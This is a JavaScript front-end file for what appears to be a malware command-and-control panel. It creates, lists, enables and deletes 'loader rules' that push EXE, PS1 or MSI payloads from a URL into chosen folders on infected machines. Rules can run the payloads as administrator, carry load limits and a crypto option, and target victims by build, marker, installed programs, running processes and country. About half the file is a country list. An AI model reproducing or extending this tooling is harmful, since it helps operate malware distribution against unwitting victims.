
var create_rule_modal = new bootstrap.Modal(document.getElementById('create_rule_modal'), 
{
    backdrop: 'static',
    keyboard: false
});

var modal_create_button = document.querySelector('#modal_create_button');

$(document).ready(function()
{
    table = $('#loader_table').DataTable(
    {
        dom: '<"top"i>rt<"bottom"lp><"clear">', 
        paging: true,
        pagingType: "full_numbers",
        processing: true,
        serverSide: true,
        ordering: false,
        searching: false,
        pageLength: 25,
        lengthMenu: [ [10, 25, 50, 100, 200], [10, 25, 50, 100, 200] ],
        autoWidth: false,
    
        ajax:
        {
            url: 'api/loader', 
            type: 'POST',
    
            data: function (d) 
            {
                d.method                    = "get_rules";
                delete d.columns;
                delete d.search;
            }
        },

        columns: 
        [
            {
                data: null,
                "render": function (data, type, row) 
                {
                    return `${data.loader_id}`;
                }
            },
            {
                data: null,
                "render": function (data, type, row) 
                {
                    return `${data.name}`;
                }
            },
            {
                data: null,
                "render": function (data, type, row) 
                {
                    var html = ``;

                    switch(data.type)
                    {
                        case "0":
                            html = `<span class="mb-1 badge text-bg-primary">EXE</span>`;
                            break;

                        case "1":
                            html = `<span class="mb-1 badge text-bg-info">PS1</span>`;
                            break;

                        case "2":
                            html = `<span class="mb-1 badge text-bg-secondary">MSI</span>`;
                            break;
                    }

                    return html;
                }
            },
            {
                data: null,
                "render": function (data, type, row) 
                {
                    // url from task
                    return `<div class="cell-content">${data.url}</div>`;
                }
            },
            {
                data: null,
                "render": function (data, type, row) 
                {
                    if(data.load_limit > 0)
                    {
                        return `${data.count}/${data.load_limit}`;
                    }
                    else
                    {
                        return `${data.count}/<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M7 7.75a4.25 4.25 0 0 0 0 8.5c.597 0 1.045-.107 1.407-.284c.362-.176.679-.442.986-.816c.54-.66.983-1.558 1.567-2.741q.175-.355.37-.744l.34-.69c.581-1.181 1.117-2.27 1.777-3.075c.41-.501.89-.923 1.49-1.215S16.216 6.25 17 6.25a5.75 5.75 0 1 1-3.45 10.35a.75.75 0 0 1 .9-1.2A4.25 4.25 0 1 0 17 7.75c-.597 0-1.045.107-1.407.284c-.362.176-.679.442-.986.816c-.54.66-.983 1.558-1.567 2.741q-.175.355-.37.744l-.34.69c-.581 1.181-1.117 2.27-1.777 3.076c-.41.5-.89.922-1.49 1.214s-1.28.435-2.063.435A5.75 5.75 0 1 1 10.451 7.4a.75.75 0 1 1-.901 1.2A4.23 4.23 0 0 0 7 7.75" clip-rule="evenodd"/></svg>`;
                    }
                }
            },
            {
                data: null,
                "render": function (data, type, row) 
                {
                    var folder_name = ``;

                    switch(data.csidl)
                    {
                        case "0":// CSIDL_LOCAL_APPDATA
                            folder_name = `%LOCALAPPDATA%`;
                            break;

                        case "1":// CSIDL_APPDATA
                            folder_name = `%APPDATA%`;
                            break;

                        case "2":// CSIDL_DESKTOPDIRECTORY
                            folder_name = `%DESKTOP%`;
                            break;

                        case "3":// CSIDL_PROFILE
                            folder_name = `%USERPROFILE%`;
                            break;

                        case "4":// CSIDL_PERSONAL
                            folder_name = `%DOCUMENTS%`;
                            break;

                        case "5":// CSIDL_PROGRAM_FILES
                            folder_name = `%PROGRAMFILES%`;
                            break;

                        case "6":// CSIDL_PROGRAM_FILESX86
                            folder_name = `%PROGRAMFILES_86%`;
                            break;
                    }

                    return `<span class="mb-1 badge text-bg-info">${folder_name}</span>`;
                }
            },
            {
                data: null,
                "render": function (data, type, row) 
                {
                    // triggers list
                    var html = `<div class="triggers-content">`;
                    
                    if(data.run_as_admin > 0)
                    {
                        html += `<span class="mb-1 badge text-bg-warning">Run as Admin</span><br>`;
                    }

                    if (data.hasOwnProperty('builds') && data.builds.length > 0) 
                    {
                        let builds = data.builds.split(",");

                        for (let build of builds) 
                        {
                            html += `<span class="mb-1 badge text-bg-danger" title="Build: ${build}">${build}</span><br>`;
                        }
                    }

                    if (data.hasOwnProperty('markers') && data.markers.length > 0) 
                    {
                        let markers = data.markers.split(",");

                        for (let marker of markers) 
                        {
                            html += `<span class="mb-1 badge text-bg-secondary" title="Marker: ${marker}">${marker}</span><br>`;
                        }
                    }

                    if (data.hasOwnProperty('programs') && data.programs != null) 
                    {
                        let programs = data.programs.split(",");

                        for (let program of programs) 
                        {
                            html += `<span class="mb-1 badge  bg-secondary-subtle text-secondary" title="Program: ${program}">${program}</span><br>`;
                        }
                    }

                    if (data.hasOwnProperty('process') && data.process != null) 
                    {
                        let process = data.process.split(",");

                        for (let proc of process) 
                        {
                            html += `<span class="mb-1 badge  bg-warning-subtle text-warning" title="Process: ${proc}">${proc}</span><br>`;
                        }
                    }

                    if (data.hasOwnProperty('geo') && data.geo != null) 
                    {
                        let geo = data.geo.split(",");

                        for (let country of geo) 
                        {
                            if(country.length > 0)
                            {
                                html += `<span class="mb-1 badge bg-primary-subtle text-primary" title="Country: ${country}"><img src="assets/images/flags/${country.toLowerCase()}.png" height="12" placeholder=""> ${country}</span>&nbsp;&nbsp;`;
                            }
                        }
                    }

                    html += `</div>`;

                    return html;
                }
            },
            {
                data: null,
                "render": function (data, type, row) 
                {
                    switch(data.active)
                    {
                        case "0":
                            return `<span class="mb-1 badge text-bg-danger">Disabled</span>`;
                            break;

                        case "1":
                            return `<span class="mb-1 badge text-bg-primary">Active</span>`;
                            break;
                    }
                }
            },
            {
                data: null,
                "render": function (data, type, row) 
                {
                    return `
                    <div class="btn-group">
                        <button class="btn btn-primary dropdown-toggle" type="button" id="dropdownMenuButton" data-bs-toggle="dropdown" aria-expanded="false">Actions</button>
                        
                        <ul class="dropdown-menu" aria-labelledby="dropdownMenuButton" style="">
                            <li>
                                <a class="dropdown-item" href="javascript:void(0)" onclick="ChangeStatus('${data.loader_id}', '${data.active == 1 ? '0' : '1'}')">${data.active == 1 ? 'Disable' : 'Enable'}</a>
                            </li>
                            <li>
                                <hr class="dropdown-divider">
                            </li>
                            <li>
                                <a class="dropdown-item" href="javascript:void(0)" onclick="DeleteRule('${data.loader_id}')">Delete</a>
                            </li>
                        </ul>
                    </div>
                    `;
                }
            },
        ]
    });
});

function ChangeStatus(loader_id, rule_active)
{
    $.post('api/loader', 
    { 
        method: 'change_status',
        loader_id: loader_id,
        rule_active: rule_active
    },
    function(response) 
    {
        if (response.success)
        {
            table.draw();
            toastr.info(response.success);
        }
        else
        {
            toastr.warning(response.error);
        }
    }, 'json');
}

function DeleteRule(loader_id)
{
    $.post('api/loader', 
    { 
        method: 'delete_rule',
        loader_id: loader_id
    },
    function(response) 
    {
        if (response.success)
        {
            table.draw();
            toastr.info(response.success);
        }
        else
        {
            toastr.warning(response.error);
        }
    }, 'json');
}

function createRuleModal()
{
    modal_create_button.removeEventListener('click', handleCreateRule);

    document.getElementById("modal_create_rule_header").innerText = "Create Loader Rule";
    modal_create_button.innerText = "Create";

    $.post('api/loader', 
    { 
        method: 'get_info'
    },
    function(response)
    {
        document.getElementById("create_rule_name").value = "";
        document.getElementById("create_rule_url").value = "";
        document.getElementById("create_rule_geo").value = "";
        document.getElementById("create_rule_limit").value = "";

        $('#create_rule_builds').empty();
        $('#create_rule_markers').empty();
        $('#create_rule_programs').empty();
        $('#create_rule_process').empty();
        $('#create_rule_geo').empty();

        $('#create_rule_builds').select2(
        {
            dropdownParent: $('#create_rule_modal'),
            data: response.builds,
            searchInputPlaceholder: 'Search options',
            placeholder: "Builds",		
        });

        $('#create_rule_markers').select2(
        {
            dropdownParent: $('#create_rule_modal'),
            data: response.markers,
            searchInputPlaceholder: 'Search options',
            placeholder: "Markers",			
        });

        $('#create_rule_programs').select2(
        {
            tags: true,
            tokenSeparators: [','],
            placeholder: "Programs",	
        });

        $('#create_rule_process').select2(
        {
            tags: true,
            tokenSeparators: [','],
            placeholder: "Processes",	
        });

        $.each(countries, function(index, country) 
        {
            $('#create_rule_geo').append(new Option(country.text, country.id, false, false));
        });

        $('#create_rule_geo').select2(
        {
            dropdownParent: $('#create_rule_modal'),
            placeholder: "Select a country",
            allowClear: true
        });

        $('#create_rule_csidl').val(0);
        $('#create_rule_admin').prop('checked', false);

        modal_create_button.addEventListener('click', handleCreateRule);
        create_rule_modal.show();
    }, 'json');
}

function handleCreateRule()
{
    var rule_name           = $('#create_rule_name').val();
    var rule_url            = $('#create_rule_url').val();
    var rule_geo            = $('#create_rule_geo').val();
    var rule_builds         = utf8_to_b64($('#create_rule_builds').val());
    var rule_markers        = utf8_to_b64($('#create_rule_markers').val());

    var rule_programs       = utf8_to_b64($('#create_rule_programs').val());
    var rule_process        = utf8_to_b64($('#create_rule_process').val());

    var rule_csidl          = $('#create_rule_csidl').val();
    var rule_admin          = $('#create_rule_admin').is(':checked') ? 1 : 0;
    var rule_limit          = $('#create_rule_limit').val();
    var rule_type           = $('#create_rule_type').val();

    var rule_crypto         = $('#create_rule_crypto').is(':checked') ? 1 : 0;

    if (rule_name.trim().length > 0 & rule_url.trim().length > 0)
    {
        $.post('api/loader', 
        {
            method: "add_rule",
            rule_name: rule_name,
            rule_url: rule_url,
            rule_geo: rule_geo,
            rule_builds: rule_builds,
            rule_markers: rule_markers,
            rule_programs: rule_programs,
            rule_process: rule_process,
            rule_csidl: rule_csidl,
            rule_admin: rule_admin,
            rule_limit: rule_limit,
            rule_type: rule_type,
            rule_crypto: rule_crypto
        },
        function(response) 
        {
            if (response.success)
            {
                table.draw();
                create_rule_modal.hide();

                toastr.info(response.success);
            }
            else
            {
                toastr.warning(response.error);
            }
        }, 'json');
    }
    else
    {
        toastr.error("Error: Enter Name and URL");
    }
}

function utf8_to_b64(str) 
{
	return window.btoa(unescape(encodeURIComponent(str)));
}

var countries = [
    { id: "AF", text: "Afghanistan (AF)" },
    { id: "AL", text: "Albania (AL)" },
    { id: "DZ", text: "Algeria (DZ)" },
    { id: "AS", text: "American Samoa (AS)" },
    { id: "AD", text: "Andorra (AD)" },
    { id: "AO", text: "Angola (AO)" },
    { id: "AI", text: "Anguilla (AI)" },
    { id: "AQ", text: "Antarctica (AQ)" },
    { id: "AG", text: "Antigua and Barbuda (AG)" },
    { id: "AR", text: "Argentina (AR)" },
    { id: "AM", text: "Armenia (AM)" },
    { id: "AW", text: "Aruba (AW)" },
    { id: "AU", text: "Australia (AU)" },
    { id: "AT", text: "Austria (AT)" },
    { id: "AZ", text: "Azerbaijan (AZ)" },
    { id: "BS", text: "Bahamas (BS)" },
    { id: "BH", text: "Bahrain (BH)" },
    { id: "BD", text: "Bangladesh (BD)" },
    { id: "BB", text: "Barbados (BB)" },
    { id: "BE", text: "Belgium (BE)" },
    { id: "BZ", text: "Belize (BZ)" },
    { id: "BJ", text: "Benin (BJ)" },
    { id: "BM", text: "Bermuda (BM)" },
    { id: "BT", text: "Bhutan (BT)" },
    { id: "BO", text: "Bolivia (BO)" },
    { id: "BA", text: "Bosnia and Herzegovina (BA)" },
    { id: "BW", text: "Botswana (BW)" },
    { id: "BV", text: "Bouvet Island (BV)" },
    { id: "BR", text: "Brazil (BR)" },
    { id: "IO", text: "British Indian Ocean Territory (IO)" },
    { id: "BN", text: "Brunei Darussalam (BN)" },
    { id: "BG", text: "Bulgaria (BG)" },
    { id: "BF", text: "Burkina Faso (BF)" },
    { id: "BI", text: "Burundi (BI)" },
    { id: "KH", text: "Cambodia (KH)" },
    { id: "CM", text: "Cameroon (CM)" },
    { id: "CA", text: "Canada (CA)" },
    { id: "CV", text: "Cape Verde (CV)" },
    { id: "KY", text: "Cayman Islands (KY)" },
    { id: "CF", text: "Central African Republic (CF)" },
    { id: "TD", text: "Chad (TD)" },
    { id: "CL", text: "Chile (CL)" },
    { id: "CN", text: "China (CN)" },
    { id: "CX", text: "Christmas Island (CX)" },
    { id: "CC", text: "Cocos (Keeling) Islands (CC)" },
    { id: "CO", text: "Colombia (CO)" },
    { id: "KM", text: "Comoros (KM)" },
    { id: "CG", text: "Congo (CG)" },
    { id: "CD", text: "Congo, Democratic Republic (CD)" },
    { id: "CK", text: "Cook Islands (CK)" },
    { id: "CR", text: "Costa Rica (CR)" },
    { id: "CI", text: "Côte d'Ivoire (CI)" },
    { id: "HR", text: "Croatia (HR)" },
    { id: "CU", text: "Cuba (CU)" },
    { id: "CY", text: "Cyprus (CY)" },
    { id: "CZ", text: "Czech Republic (CZ)" },
    { id: "DK", text: "Denmark (DK)" },
    { id: "DJ", text: "Djibouti (DJ)" },
    { id: "DM", text: "Dominica (DM)" },
    { id: "DO", text: "Dominican Republic (DO)" },
    { id: "EC", text: "Ecuador (EC)" },
    { id: "EG", text: "Egypt (EG)" },
    { id: "SV", text: "El Salvador (SV)" },
    { id: "GQ", text: "Equatorial Guinea (GQ)" },
    { id: "ER", text: "Eritrea (ER)" },
    { id: "EE", text: "Estonia (EE)" },
    { id: "ET", text: "Ethiopia (ET)" },
    { id: "FK", text: "Falkland Islands (FK)" },
    { id: "FO", text: "Faroe Islands (FO)" },
    { id: "FJ", text: "Fiji (FJ)" },
    { id: "FI", text: "Finland (FI)" },
    { id: "FR", text: "France (FR)" },
    { id: "GF", text: "French Guiana (GF)" },
    { id: "PF", text: "French Polynesia (PF)" },
    { id: "TF", text: "French Southern Territories (TF)" },
    { id: "GA", text: "Gabon (GA)" },
    { id: "GM", text: "Gambia (GM)" },
    { id: "GE", text: "Georgia (GE)" },
    { id: "DE", text: "Germany (DE)" },
    { id: "GH", text: "Ghana (GH)" },
    { id: "GI", text: "Gibraltar (GI)" },
    { id: "GR", text: "Greece (GR)" },
    { id: "GL", text: "Greenland (GL)" },
    { id: "GD", text: "Grenada (GD)" },
    { id: "GP", text: "Guadeloupe (GP)" },
    { id: "GU", text: "Guam (GU)" },
    { id: "GT", text: "Guatemala (GT)" },
    { id: "GG", text: "Guernsey (GG)" },
    { id: "GN", text: "Guinea (GN)" },
    { id: "GW", text: "Guinea-Bissau (GW)" },
    { id: "GY", text: "Guyana (GY)" },
    { id: "HT", text: "Haiti (HT)" },
    { id: "HM", text: "Heard Island and McDonald Islands (HM)" },
    { id: "VA", text: "Vatican City (VA)" },
    { id: "HN", text: "Honduras (HN)" },
    { id: "HK", text: "Hong Kong (HK)" },
    { id: "HU", text: "Hungary (HU)" },
    { id: "IS", text: "Iceland (IS)" },
    { id: "IN", text: "India (IN)" },
    { id: "ID", text: "Indonesia (ID)" },
    { id: "IR", text: "Iran (IR)" },
    { id: "IQ", text: "Iraq (IQ)" },
    { id: "IE", text: "Ireland (IE)" },
    { id: "IM", text: "Isle of Man (IM)" },
    { id: "IL", text: "Israel (IL)" },
    { id: "IT", text: "Italy (IT)" },
    { id: "JM", text: "Jamaica (JM)" },
    { id: "JP", text: "Japan (JP)" },
    { id: "JE", text: "Jersey (JE)" },
    { id: "JO", text: "Jordan (JO)" },
    { id: "KE", text: "Kenya (KE)" },
    { id: "KI", text: "Kiribati (KI)" },
    { id: "KP", text: "North Korea (KP)" },
    { id: "KR", text: "South Korea (KR)" },
    { id: "KW", text: "Kuwait (KW)" },
    { id: "KG", text: "Kyrgyzstan (KG)" },
    { id: "LA", text: "Laos (LA)" },
    { id: "LV", text: "Latvia (LV)" },
    { id: "LB", text: "Lebanon (LB)" },
    { id: "LS", text: "Lesotho (LS)" },
    { id: "LR", text: "Liberia (LR)" },
    { id: "LY", text: "Libya (LY)" },
    { id: "LI", text: "Liechtenstein (LI)" },
    { id: "LT", text: "Lithuania (LT)" },
    { id: "LU", text: "Luxembourg (LU)" },
    { id: "MO", text: "Macao (MO)" },
    { id: "MK", text: "North Macedonia (MK)" },
    { id: "MG", text: "Madagascar (MG)" },
    { id: "MW", text: "Malawi (MW)" },
    { id: "MY", text: "Malaysia (MY)" },
    { id: "MV", text: "Maldives (MV)" },
    { id: "ML", text: "Mali (ML)" },
    { id: "MT", text: "Malta (MT)" },
    { id: "MH", text: "Marshall Islands (MH)" },
    { id: "MQ", text: "Martinique (MQ)" },
    { id: "MR", text: "Mauritania (MR)" },
    { id: "MU", text: "Mauritius (MU)" },
    { id: "YT", text: "Mayotte (YT)" },
    { id: "MX", text: "Mexico (MX)" },
    { id: "FM", text: "Micronesia (FM)" },
    { id: "MD", text: "Moldova (MD)" },
    { id: "MC", text: "Monaco (MC)" },
    { id: "MN", text: "Mongolia (MN)" },
    { id: "ME", text: "Montenegro (ME)" },
    { id: "MS", text: "Montserrat (MS)" },
    { id: "MA", text: "Morocco (MA)" },
    { id: "MZ", text: "Mozambique (MZ)" },
    { id: "MM", text: "Myanmar (MM)" },
    { id: "NA", text: "Namibia (NA)" },
    { id: "NR", text: "Nauru (NR)" },
    { id: "NP", text: "Nepal (NP)" },
    { id: "NL", text: "Netherlands (NL)" },
    { id: "NC", text: "New Caledonia (NC)" },
    { id: "NZ", text: "New Zealand (NZ)" },
    { id: "NI", text: "Nicaragua (NI)" },
    { id: "NE", text: "Niger (NE)" },
    { id: "NG", text: "Nigeria (NG)" },
    { id: "NU", text: "Niue (NU)" },
    { id: "NF", text: "Norfolk Island (NF)" },
    { id: "MP", text: "Northern Mariana Islands (MP)" },
    { id: "NO", text: "Norway (NO)" },
    { id: "OM", text: "Oman (OM)" },
    { id: "PK", text: "Pakistan (PK)" },
    { id: "PW", text: "Palau (PW)" },
    { id: "PS", text: "Palestine (PS)" },
    { id: "PA", text: "Panama (PA)" },
    { id: "PG", text: "Papua New Guinea (PG)" },
    { id: "PY", text: "Paraguay (PY)" },
    { id: "PE", text: "Peru (PE)" },
    { id: "PH", text: "Philippines (PH)" },
    { id: "PN", text: "Pitcairn (PN)" },
    { id: "PL", text: "Poland (PL)" },
    { id: "PT", text: "Portugal (PT)" },
    { id: "PR", text: "Puerto Rico (PR)" },
    { id: "QA", text: "Qatar (QA)" },
    { id: "RE", text: "Réunion (RE)" },
    { id: "RO", text: "Romania (RO)" },
    { id: "RW", text: "Rwanda (RW)" },
    { id: "BL", text: "Saint Barthélemy (BL)" },
    { id: "SH", text: "Saint Helena (SH)" },
    { id: "KN", text: "Saint Kitts and Nevis (KN)" },
    { id: "LC", text: "Saint Lucia (LC)" },
    { id: "MF", text: "Saint Martin (MF)" },
    { id: "PM", text: "Saint Pierre and Miquelon (PM)" },
    { id: "VC", text: "Saint Vincent and the Grenadines (VC)" },
    { id: "WS", text: "Samoa (WS)" },
    { id: "SM", text: "San Marino (SM)" },
    { id: "ST", text: "Sao Tome and Principe (ST)" },
    { id: "SA", text: "Saudi Arabia (SA)" },
    { id: "SN", text: "Senegal (SN)" },
    { id: "RS", text: "Serbia (RS)" },
    { id: "SC", text: "Seychelles (SC)" },
    { id: "SL", text: "Sierra Leone (SL)" },
    { id: "SG", text: "Singapore (SG)" },
    { id: "SX", text: "Sint Maarten (SX)" },
    { id: "SK", text: "Slovakia (SK)" },
    { id: "SI", text: "Slovenia (SI)" },
    { id: "SB", text: "Solomon Islands (SB)" },
    { id: "SO", text: "Somalia (SO)" },
    { id: "ZA", text: "South Africa (ZA)" },
    { id: "GS", text: "South Georgia and the South Sandwich Islands (GS)" },
    { id: "SS", text: "South Sudan (SS)" },
    { id: "ES", text: "Spain (ES)" },
    { id: "LK", text: "Sri Lanka (LK)" },
    { id: "SD", text: "Sudan (SD)" },
    { id: "SR", text: "Suriname (SR)" },
    { id: "SJ", text: "Svalbard and Jan Mayen (SJ)" },
    { id: "SE", text: "Sweden (SE)" },
    { id: "CH", text: "Switzerland (CH)" },
    { id: "SY", text: "Syria (SY)" },
    { id: "TW", text: "Taiwan (TW)" },
    { id: "TJ", text: "Tajikistan (TJ)" },
    { id: "TZ", text: "Tanzania (TZ)" },
    { id: "TH", text: "Thailand (TH)" },
    { id: "TL", text: "Timor-Leste (TL)" },
    { id: "TG", text: "Togo (TG)" },
    { id: "TK", text: "Tokelau (TK)" },
    { id: "TO", text: "Tonga (TO)" },
    { id: "TT", text: "Trinidad and Tobago (TT)" },
    { id: "TN", text: "Tunisia (TN)" },
    { id: "TR", text: "Turkey (TR)" },
    { id: "TM", text: "Turkmenistan (TM)" },
    { id: "TC", text: "Turks and Caicos Islands (TC)" },
    { id: "TV", text: "Tuvalu (TV)" },
    { id: "UG", text: "Uganda (UG)" },
    { id: "AE", text: "United Arab Emirates (AE)" },
    { id: "GB", text: "United Kingdom (GB)" },
    { id: "US", text: "United States (US)" },
    { id: "UM", text: "United States Minor Outlying Islands (UM)" },
    { id: "UY", text: "Uruguay (UY)" },
    { id: "VU", text: "Vanuatu (VU)" },
    { id: "VE", text: "Venezuela (VE)" },
    { id: "VN", text: "Vietnam (VN)" },
    { id: "VG", text: "British Virgin Islands (VG)" },
    { id: "VI", text: "U.S. Virgin Islands (VI)" },
    { id: "WF", text: "Wallis and Futuna (WF)" },
    { id: "EH", text: "Western Sahara (EH)" },
    { id: "YE", text: "Yemen (YE)" },
    { id: "ZM", text: "Zambia (ZM)" },
    { id: "ZW", text: "Zimbabwe (ZW)" }
];